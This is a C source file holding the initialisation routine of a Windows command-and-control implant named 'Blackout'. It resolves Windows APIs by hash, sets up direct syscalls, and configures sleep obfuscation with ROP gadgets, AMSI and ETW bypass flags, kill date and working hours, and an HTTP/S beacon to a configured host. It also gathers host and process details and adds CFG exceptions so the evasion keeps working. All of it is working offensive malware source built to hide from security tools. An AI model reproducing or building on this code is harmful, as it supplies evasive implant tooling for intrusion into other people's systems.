#include <common.h>
#include <utils.h>
#include <constexpr.h>
#include <evasion.h>

FUNC VOID BlackoutInit( 
    PVOID Param
 ) {
    BLACKOUT_INSTANCE

    Instance()->Teb = NtCurrentTeb();

    Instance()->Modules.Kernel32   = LdrLoadModule( HASH_STR( "KERNEL32.DLL" ) );
    Instance()->Modules.Kernelbase = LdrLoadModule( HASH_STR( "KERNELBASE.dll" ) );
    Instance()->Modules.Ntdll      = LdrLoadModule( HASH_STR( "ntdll.dll" ) );

    Instance()->Win32.LoadLibraryA   = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA" ) );
    Instance()->Win32.GetProcAddress = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress" ) );

    Instance()->Win32.GetModuleHandleA          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetModuleHandleA" ) );
    Instance()->Win32.CreateTimerQueueTimer     = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateTimerQueueTimer" ) );
    Instance()->Win32.OpenProcess               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "OpenProcess" ) );
    Instance()->Win32.OpenThread                = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "OpenThread" ) );
    Instance()->Win32.CreateProcessA            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessA" ) );
    Instance()->Win32.CreateProcessW            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessW" ) );
    Instance()->Win32.CreateProcessAsUserA      = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessAsUserA" ) );
    Instance()->Win32.CreateProcessAsUserW      = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessAsUserW" ) );
    Instance()->Win32.CreateProcessWithLogonW   = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessWithLogonW" ) );
    Instance()->Win32.CreateProcessWithTokenW   = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessWithTokenW" ) );
    Instance()->Win32.WaitForDebugEvent         = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "WaitForDebugEvent" ) );
    Instance()->Win32.WriteProcessMemory        = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "WriteProcessMemory" ) );
    Instance()->Win32.DebugActiveProcessStop    = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "DebugActiveProcessStop" ) );
    Instance()->Win32.ContinueDebugEvent        = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "ContinueDebugEvent" ) );
    Instance()->Win32.FreeLibrary               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "FreeLibrary" ) );
    Instance()->Win32.CloseHandle               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CloseHandle" ) );
    Instance()->Win32.GetLastError              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetLastError" ) );
    Instance()->Win32.LocalAlloc                = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LocalAlloc" ) );
    Instance()->Win32.LocalFree                 = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LocalFree" ) );
    Instance()->Win32.LocalReAlloc              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LocalReAlloc" ) );
    Instance()->Win32.VirtualFree               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualFree" ) );
    Instance()->Win32.VirtualQuery              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualQuery" ) );
    Instance()->Win32.VirtualQueryEx            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualQueryEx" ) );
    Instance()->Win32.VirtualAlloc              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc" ) );
    Instance()->Win32.VirtualAllocEx            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualAllocEx" ) );
    Instance()->Win32.VirtualProtect            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect" ) );
    Instance()->Win32.VirtualProtectEx          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtectEx" ) );
    Instance()->Win32.WaitForSingleObject       = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObject" ) );
    Instance()->Win32.WaitForSingleObjectEx     = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObjectEx" ) );
    Instance()->Win32.HeapWalk                  = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "HeapWalk" ) );
    Instance()->Win32.CreatePipe                = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreatePipe" ) );
    Instance()->Win32.CreateNamedPipeA          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateNamedPipeA" ) );
    Instance()->Win32.CreateNamedPipeW          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateNamedPipeW" ) );
    Instance()->Win32.ConnectNamedPipe          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "ConnectNamedPipe" ) );
    Instance()->Win32.CreateMailslotA           = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateMailslotA" ) );
    Instance()->Win32.CreateMailslotW           = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateMailslotW" ) );
    Instance()->Win32.CreateFileA               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateFileA" ) );
    Instance()->Win32.CreateFileW               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateFileW" ) );
    Instance()->Win32.ReadFile                  = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "ReadFile" ) );
    Instance()->Win32.FormatMessageA            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "FormatMessageA" ) );
    Instance()->Win32.GetCurrentDirectoryA      = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetCurrentDirectoryA" ) );
    Instance()->Win32.SetCurrentDirectoryA      = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "SetCurrentDirectoryA" ) );
    Instance()->Win32.CreateThread              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateThread" ) );
    Instance()->Win32.CreateRemoteThread        = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "CreateRemoteThread" ) );
    Instance()->Win32.QueueUserAPC              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "QueueUserAPC" ) ); 
    Instance()->Win32.GetTickCount              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetTickCount" ) );
    Instance()->Win32.GetComputerNameExA        = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetComputerNameExA" ) );
    Instance()->Win32.TerminateProcess          = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "TerminateProcess" ) );
    Instance()->Win32.GetProductInfo            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetProductInfo" ) );
    Instance()->Win32.GetNativeSystemInfo       = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetNativeSystemInfo" )  );
    Instance()->Win32.DuplicateHandle           = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "DuplicateHandle" )  );
    Instance()->Win32.GetThreadId               = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetThreadId" )  );
    Instance()->Win32.ResumeThread              = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "ResumeThread" )  );
    Instance()->Win32.SuspendThread             = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "SuspendThread" )  );
    Instance()->Win32.GetMappedFileNameA        = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "GetMappedFileNameA" )  );
    Instance()->Win32.TerminateThread           = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "TerminateThread" )  );
    Instance()->Win32.SetFileInformationByHandle= LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "SetFileInformationByHandle" )  );
    Instance()->Win32.LoadLibraryExA            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExA" )  );
    Instance()->Win32.LoadLibraryExW            = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExW" )  );
    Instance()->Win32.SetEvent                  = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "SetEvent" )  );
    Instance()->Win32.ReadProcessMemory         = LdrLoadFunc( Instance()->Modules.Kernel32, HASH_STR( "ReadProcessMemory" )  );
    Instance()->Win32.InitializeProcThreadAttributeList = Instance()->Win32.GetProcAddress( Instance()->Modules.Kernelbase, "InitializeProcThreadAttributeList"   );
    Instance()->Win32.UpdateProcThreadAttribute         = Instance()->Win32.GetProcAddress( Instance()->Modules.Kernelbase, "UpdateProcThreadAttribute"   );
    Instance()->Win32.DeleteProcThreadAttributeList     = Instance()->Win32.GetProcAddress( Instance()->Modules.Kernelbase, "DeleteProcThreadAttributeList"  );
    Instance()->Win32.RtlCaptureContext                 = Instance()->Win32.GetProcAddress( Instance()->Modules.Kernel32, "RtlCaptureContext" );


    Instance()->Win32.RtlDeleteTimer            = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlDeleteTimer" ) );
    Instance()->Win32.RtlDeleteTimerQueue       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlDeleteTimerQueue" ) );
    Instance()->Win32.RtlDeleteCriticalSection     = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlDeleteCriticalSection" )  );
    Instance()->Win32.RtlInitializeCriticalSection = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlInitializeCriticalSection" )  );
    Instance()->Win32.RtlCompareMemory          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlCompareMemory" )  );
    Instance()->Win32._RtlCopyMemory             = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlCopyMemory" )  );
    Instance()->Win32.RtlExitUserProcess        = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserProcess" ) );
    Instance()->Win32.RtlExitUserThread         = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserThread" ) );
    Instance()->Win32.RtlAllocateHeap           = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlAllocateHeap" ) );
    Instance()->Win32.RtlReAllocateHeap         = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlReAllocateHeap" ) );
    Instance()->Win32.RtlFreeHeap               = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlFreeHeap" ) );

    Instance()->Win32.NtUnmapViewOfSection      = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtUnmapViewOfSection" ) );
    Instance()->Win32.NtMapViewOfSection        = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtMapViewOfSection" ) );
    Instance()->Win32.NtCreateSection           = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateSection" ) );
    Instance()->Win32.TpReleaseCleanupGroupMembers = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "TpReleaseCleanupGroupMembers" ) );
    Instance()->Win32.NtFreeVirtualMemory       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtFreeVirtualMemory" )  );
    Instance()->Win32.RtlCreateTimer            = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimer" ) );
    Instance()->Win32.RtlRandomEx               = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlRandomEx" ) );
    Instance()->Win32.RtlGetVersion             = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlGetVersion" ));
    Instance()->Win32.RtlIpv6StringToAddressA   = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlIpv6StringToAddressA" ) );
    Instance()->Win32.NtAllocateVirtualMemory   = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtAllocateVirtualMemory" ) );
    Instance()->Win32.NtProtectVirtualMemory    = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) );
    Instance()->Win32.NtCreateThreadEx          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
    Instance()->Win32.LdrLoadDll                = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "LdrLoadDll" ) );
    Instance()->Win32.LdrUnloadDll              = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "LdrUnloadDll" ) );
    Instance()->Win32.NtGetNextProcess          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtGetNextProcess" ) );

    Instance()->Win32.NtQuerySystemInformation  = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
    Instance()->Win32.NtQueryInformationProcess = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationProcess" ) );
    Instance()->Win32.NtQueryVirtualMemory      = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQueryVirtualMemory" ) );
    Instance()->Win32.NtQueryInformationToken   = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationToken" ) );
    Instance()->Win32.NtQueryInformationThread  = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationThread" ) );
    Instance()->Win32.NtSetInformationVirtualMemory = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtSetInformationVirtualMemory" ) );
    
    Instance()->Win32.RtlAddVectoredContinueHandler      = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlAddVectoredContinueHandler" ) );
    Instance()->Win32.RtlAddVectoredExceptionHandler     = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlAddVectoredExceptionHandler" ) );
    Instance()->Win32.RtlRemoveVectoredContinueHandler   = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlRemoveVectoredContinueHandler" ) );
    Instance()->Win32.RtlRemoveVectoredExceptionHandler  = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlRemoveVectoredExceptionHandler" ) );

    Instance()->Win32.RtlCreateTimerQueue       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimerQueue" ) );
    Instance()->Win32.NtAlertResumeThread       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtAlertResumeThread" ) );
    Instance()->Win32.NtContinue                = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtContinue" ) );
    Instance()->Win32.NtCreateEvent             = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateEvent" ) );
    Instance()->Win32.NtCreateThreadEx          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
    Instance()->Win32.NtQueueApcThread          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtQueueApcThread" ) );
    Instance()->Win32.NtGetContextThread        = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtGetContextThread" ) );
    Instance()->Win32.NtSetContextThread        = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtSetContextThread" ) );
    Instance()->Win32.NtTestAlert               = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtTestAlert" ) );
    Instance()->Win32.NtWaitForSingleObject     = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtWaitForSingleObject" ) );
    Instance()->Win32.NtSignalAndWaitForSingleObject = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtSignalAndWaitForSingleObject" ) );
    Instance()->Win32.NtCreateFile              = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateFile" ) );
    Instance()->Win32.NtCreateNamedPipeFile     = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtCreateNamedPipeFile" ) );   
    Instance()->Win32.NtWriteVirtualMemory      = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtWriteVirtualMemory" ) ); 
    Instance()->Win32.NtOpenProcess             = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcess" ) ); 
    Instance()->Win32.NtResumeThread            = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtResumeThread" ) ); 
    Instance()->Win32.NtSuspendThread           = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendThread" ) ); 
    Instance()->Win32.NtSuspendProcess          = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendProcess" ) ); 
    Instance()->Win32.NtTerminateThread         = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtTerminateThread" ) ); 
    Instance()->Win32.NtOpenProcessToken        = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcessToken" ) ); 
    Instance()->Win32.NtOpenProcessTokenEx      = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcessTokenEx" ) ); 
    Instance()->Win32.NtOpenThreadToken         = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtOpenThreadToken" ) ); 
    Instance()->Win32.NtOpenThreadTokenEx       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtOpenThreadTokenEx" ) ); 
    Instance()->Win32.NtFlushInstructionCache   = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "NtFlushInstructionCache" ) ); 
    Instance()->Win32.RtlAddFunctionTable       = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "RtlAddFunctionTable" ) );

    Instance()->Modules.Winhttp   = LdrLoadModule( HASH_STR( "Winhttp.dll" ) );
    Instance()->Modules.Advapi32  = LdrLoadModule( HASH_STR( "Advapi32.dll" ) );
    Instance()->Modules.Msvcrt    = LdrLoadModule( HASH_STR( "msvcrt.dll" ) );
    Instance()->Modules.Cryptbase = LdrLoadModule( HASH_STR( "Cryptbase.dll" ) ); 
    Instance()->Modules.Iphlpapi  = LdrLoadModule( HASH_STR( "IPHLPAPI.DLL" ) );

    if ( !Instance()->Modules.Winhttp   ) Instance()->Modules.Winhttp   = LdrLoadLib( L"Winhttp.dll"   );
    if ( !Instance()->Modules.Advapi32  ) Instance()->Modules.Advapi32  = LdrLoadLib( L"Advapi32.dll"  );
    if ( !Instance()->Modules.Msvcrt    ) Instance()->Modules.Msvcrt    = LdrLoadLib( L"Msvcrt.dll"    );
    if ( !Instance()->Modules.Cryptbase ) Instance()->Modules.Cryptbase = LdrLoadLib( L"Cryptbase.dll" );
    if ( !Instance()->Modules.Iphlpapi  ) Instance()->Modules.Iphlpapi  = LdrLoadLib( L"Iphlpapi.dll"  );

    Instance()->Win32.AdjustTokenPrivileges = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "AdjustTokenPrivileges" ) );
    Instance()->Win32.LookupPrivilegeValueA = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "LookupPrivilegeValueA" ) );
    Instance()->Win32.LookupAccountSidA     = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "LookupAccountSidA" ) );
    Instance()->Win32.GetUserNameA          = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "GetUserNameA" ) );
    Instance()->Win32.OpenProcessToken      = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "OpenProcessToken" ) );
    Instance()->Win32.OpenThreadToken       = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "OpenThreadToken" ) );
    Instance()->Win32.DuplicateToken        = LdrLoadFunc( Instance()->Modules.Advapi32, HASH_STR( "DuplicateToken" ) );

    Instance()->Win32.WinHttpOpen               = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpOpen" ) );
    Instance()->Win32.WinHttpConnect            = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpConnect" ) );
    Instance()->Win32.WinHttpOpenRequest        = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpOpenRequest" ) );
    Instance()->Win32.WinHttpReceiveResponse    = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpReceiveResponse" ) );
    Instance()->Win32.WinHttpSendRequest        = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSendRequest" ) );
    Instance()->Win32.WinHttpReadData           = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpReadData" ) );
    Instance()->Win32.WinHttpSetOption          = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSetOption") );
    Instance()->Win32.WinHttpCloseHandle        = LdrLoadFunc( Instance()->Modules.Winhttp, HASH_STR( "WinHttpCloseHandle" ) );

    Instance()->Win32.SystemFunction040 = LdrLoadFunc( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction040" ) );
    Instance()->Win32.SystemFunction041 = LdrLoadFunc( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction041" ) );

    Instance()->Win32.GetAdaptersInfo = LdrLoadFunc( Instance()->Modules.Iphlpapi, HASH_STR( "GetAdaptersInfo" ) );

    Instance()->Win32.printf  = LdrLoadFunc( Instance()->Modules.Msvcrt, HASH_STR( "printf" ) );
    Instance()->Win32.strncmp = LdrLoadFunc( Instance()->Modules.Msvcrt, HASH_STR( "strncmp" ) );
    Instance()->Win32.vprintf = LdrLoadFunc( Instance()->Modules.Msvcrt, HASH_STR( "vprintf" ) );

    /*=============================[ init syscall config ]=============================*/

    InitNtdllConf();

    FetchNtSyscall(HASH_STR("NtAllocateVirtualMemory"), &Syscall().SysTable.NtAllocateVirtualMemory);
    FetchNtSyscall(HASH_STR("NtProtectVirtualMemory"), &Syscall().SysTable.NtProtectVirtualMemory);
    FetchNtSyscall(HASH_STR("NtWriteVirtualMemory"), &Syscall().SysTable.NtWriteVirtualMemory);
    FetchNtSyscall(HASH_STR("NtOpenProcess"), &Syscall().SysTable.NtOpenProcess);
    FetchNtSyscall(HASH_STR("NtOpenThread"), &Syscall().SysTable.NtOpenThread);
    FetchNtSyscall(HASH_STR("NtOpenThreadToken"), &Syscall().SysTable.NtOpenThreadToken);
    FetchNtSyscall(HASH_STR("NtOpenProcessToken"), &Syscall().SysTable.NtOpenProcessToken);
    FetchNtSyscall(HASH_STR("NtClose"), &Syscall().SysTable.NtClose);
    FetchNtSyscall(HASH_STR("NtQueryVirtualMemory"), &Syscall().SysTable.NtQueryVirtualMemory);
    FetchNtSyscall(HASH_STR("NtFreeVirtualMemory"), &Syscall().SysTable.NtFreeVirtualMemory);
    FetchNtSyscall(HASH_STR("NtCreateThreadEx"), &Syscall().SysTable.NtCreateThreadEx);
    FetchNtSyscall(HASH_STR("NtTerminateThread"), &Syscall().SysTable.NtTerminateThread);
    FetchNtSyscall(HASH_STR("NtTerminateProcess"), &Syscall().SysTable.NtTerminateProcess);
    FetchNtSyscall(HASH_STR("NtSuspendThread"), &Syscall().SysTable.NtSuspendThread);
    FetchNtSyscall(HASH_STR("NtResumeThread"), &Syscall().SysTable.NtResumeThread);
    FetchNtSyscall(HASH_STR("NtCreateFile"), &Syscall().SysTable.NtCreateFile);
    FetchNtSyscall(HASH_STR("NtWriteFile"), &Syscall().SysTable.NtWriteFile);
    FetchNtSyscall(HASH_STR("NtCreateSection"), &Syscall().SysTable.NtCreateSection);
    FetchNtSyscall(HASH_STR("NtMapViewOfSection"), &Syscall().SysTable.NtMapViewOfSection);
    FetchNtSyscall(HASH_STR("NtUnmapViewOfSection"), &Syscall().SysTable.NtUnmapViewOfSection);
    FetchNtSyscall(HASH_STR("NtGetContextThread"), &Syscall().SysTable.NtGetContextThread);
    FetchNtSyscall(HASH_STR("NtSetContextThread"), &Syscall().SysTable.NtSetContextThread);
    FetchNtSyscall(HASH_STR("NtWaitForSingleObject"), &Syscall().SysTable.NtWaitForSingleObject);
    FetchNtSyscall(HASH_STR("NtQueueApcThread"), &Syscall().SysTable.NtQueueApcThread);

    /*============================[ Agent config initialization ]============================*/

#ifdef BK_STOMP
    CreateImplantBackup();
#endif

    Blackout().bkApi                     = _BK_API_;
    Blackout().SleepObf.Technique        = _BK_SLEEP_OBF_; 
    Blackout().SleepObf.NtContinueGadget = LdrLoadFunc( Instance()->Modules.Ntdll, HASH_STR( "LdrInitializeThunk" ) ) + 19;
    Blackout().SleepObf.JmpGadget        = FindJmpGadget( Instance()->Modules.Kernel32, RBX_REG );
    Instance()->Session.WorkingHours     = CONFIG_WRKHRS;
    Instance()->Session.KillDate         = CONFIG_KILLDATE;
    Instance()->Session.SleepTime        = CONFIG_SLEEP;
    Instance()->Session.Jitter           = 0x00;
    Instance()->Session.AgentId          = RandomNumber32();
    Blackout().AmsiBypass                = FALSE;
    Blackout().EtwBypass                 = FALSE;
    Instance()->Session.ProcessId        = U_32( Instance()->Teb->ClientId.UniqueProcess );
    Instance()->Session.ThreadId         = U_32( Instance()->Teb->ClientId.UniqueThread );

    /*============================[ Machine recognition ]============================*/

    GetComputerInfo( 
        &Instance()->System.OsArch,
        &Instance()->System.ProcessorType,
        &Instance()->System.ProductType,
        &Instance()->System.IpAddress
    );

    Instance()->System.OsMajorV        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Instance()->System.OsMinorv        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Instance()->System.OsBuildNumber   = Instance()->Teb->ProcessEnvironmentBlock->OSBuildNumber;

    Instance()->System.OsArch        = 0;
    Instance()->System.ProcessorType = 0;
    
    /*============================[ Http/s listener config ]============================*/

    Transport().Http.Host      = bkHeapAlloc( MAX_PATH * 2 );
    Transport().Http.UserAgent = bkHeapAlloc( MAX_PATH * 2 );
    Transport().Http.Port      = CONFIG_PORT;
    Transport().Http.Secure    = CONFIG_SECURE;
    MmCopy( Transport().Http.Host,      CONFIG_HOST,      sizeof( CONFIG_HOST      ) );
    MmCopy( Transport().Http.UserAgent, CONFIG_USERAGENT, sizeof( CONFIG_USERAGENT ) );

    /*============================[ Process Informations ]============================*/

    GetProcessInfo( 
        &Instance()->Session.ProcessFullPath, 
        &Instance()->Session.ProcessName, 
        &Instance()->Session.ProcessCmdLine 
    );

    /*============================[ CFG Routine to SleepObf ]============================*/

    if ( CfgCheckEnabled() ) {
        CfgAddressAdd( Instance()->Modules.Kernel32,  Instance()->Win32.VirtualProtect );
        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction040  );
        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction041  );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32._RtlCopyMemory );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtContinue );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtSetContextThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtGetContextThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtTestAlert );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtWaitForSingleObject );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlExitUserThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtProtectVirtualMemory );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlCreateTimer );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlCreateTimerQueue );
    }
}
